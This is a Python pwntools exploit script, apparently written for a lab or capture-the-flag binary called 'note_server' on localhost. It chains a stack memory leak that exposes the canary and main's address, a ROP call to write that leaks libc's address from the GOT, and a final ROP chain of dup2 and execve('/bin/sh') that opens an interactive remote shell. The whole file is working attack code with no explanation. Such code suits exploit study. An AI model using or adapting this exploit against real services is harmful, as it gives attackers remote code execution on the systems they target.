from pwn import *
from hexdump import hexdump

HOST= "127.0.0.1"
PORT = 5001

# Step 1: retrieve data from stack (canary, addr main)

s = remote(HOST, PORT)

PAD = b'0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF'

READ_255_FROM_STACK = b'\x01\xff' + PAD[0:255] + b'\x01\xff' + PAD[0:255] + b'\x01\xff' + PAD[0:255] + b'\x01\xff' + PAD[0:255] + b'\x01\x04CDEX\x02\x00\x04\xff\x03'


# 00000000  30 31 32 33 34 35 36 37  38 39 41 42 43 44 45 46  |0123456789ABCDEF|
# *
# 000003f0  30 31 32 33 34 35 36 37  38 39 41 42 43 44 45 58  |0123456789ABCDEX|
# 00000400  a0 e1 ff ff ff 7f 00 00  00 07 33 fb 7a 24 0b a3  |..........3.z$..|
# 00000410  a0 e1 ff ff ff 7f 00 00  54 4f 55 55 55 55 00 00  |........TOUUUU..| < @RBP MAIN | @MAIN
# 00000420  88 e2 ff ff ff 7f 00 00  c0 ea ff f7 01 00 00 00  |................|
# 00000430  00 00 00 00 00 00 00 00  10 00 00 00 01 00 00 00  |................|
# 00000440  03 00 00 00 89 13 00 00  04 00 00 00 00 00 00 00  |................|
# 00000450  02 00 13 89 7f 00 00 01  00 00 00 00 00 00 00 00  |................|
# 00000460  02 00 93 1e 7f 00 00 01  00 00 00 00 00 00 00 00  |................|
# 00000470  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
# *
# 000004f0  00 00 00 00 00 00 00 00  02 00 00 00 00 00 00     |...............|
# 000004ff
#
# Current RBP = @RBP MAIN - 0x100

s.send(READ_255_FROM_STACK)
data = s.recv(0x400 + 0xff)
s.close()


hexdump(data[0x3F0:])

print("@RBP FROM MAIN")
print(data[0x410:0x418])
print("@MAIN")
print(data[0x418:0x420])
rip = struct.unpack('<Q', data[0x418:0x420])[0] - 0xf54


# Step 2: Execute write with address of write from GOT to leak it
context.clear(arch = 'amd64')
ns_bin = ELF('note_server')
ns_bin.address = rip
ns_rop = ROP(ns_bin)

ns_rop.write(4, ns_bin.got['write'])

ROP_WRITE = ns_rop.chain()
DATA = data[0x400:0x418] + ROP_WRITE

L_D = (len(DATA)).to_bytes(1, byteorder='little')
print(L_D)

EXPLOIT = b'\x01\xff' + DATA + PAD[len(DATA):] + b'\x01\xff' + PAD[0:255] + b'\x01\xff' + PAD[0:255] + b'\x01\xff' + PAD[0:255] + b'\x01\x04CDEX\x02\x00\x00' + L_D + b'\x03'


print('Press ENTER to continue')
input()

s = remote(HOST, PORT)
s.send(EXPLOIT)
data = s.recv(0x400 + len(DATA))
data_write = s.recv(8)

print(">>>")
hexdump(data[0x3F0:])

# Step 3: ROP with execve("/bin/sh")
print(data)
write_addr = struct.unpack('<Q', data_write)[0]

libc = ELF('./libc.so.6')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
base_libc = write_addr - libc.symbols['write']
print("LIBC" + hex(base_libc))
libc.address = base_libc

rop = ROP(libc)
rop.dup2(4, 0)
rop.dup2(4, 1)
bin_sh = next(libc.search(b'/bin/sh\x00'))
rop.execve(bin_sh, 0, 0)

ROP_EXECVE = rop.chain()

DATA = data[0x400:0x418] + ROP_EXECVE
print("DATA + ROP_EXECVE")
hexdump(DATA)
L_D = (len(DATA)).to_bytes(1, byteorder='little')
print(L_D)

EXPLOIT = b'\x01\xff' + DATA + PAD[len(DATA):] + b'\x01\xff' + PAD[0:255] + b'\x01\xff' + PAD[0:255] + b'\x01\xff' + PAD[0:255] + b'\x01\x04CDEX\x02\x00\x00' + L_D + b'\x03'

print('Press ENTER to continue')
input()


s = remote(HOST, PORT)
s.send(EXPLOIT)

data = s.recv(0x400 + len(DATA))
hexdump(data[0x3F0:])

print("Execution done!")
s.interactive()


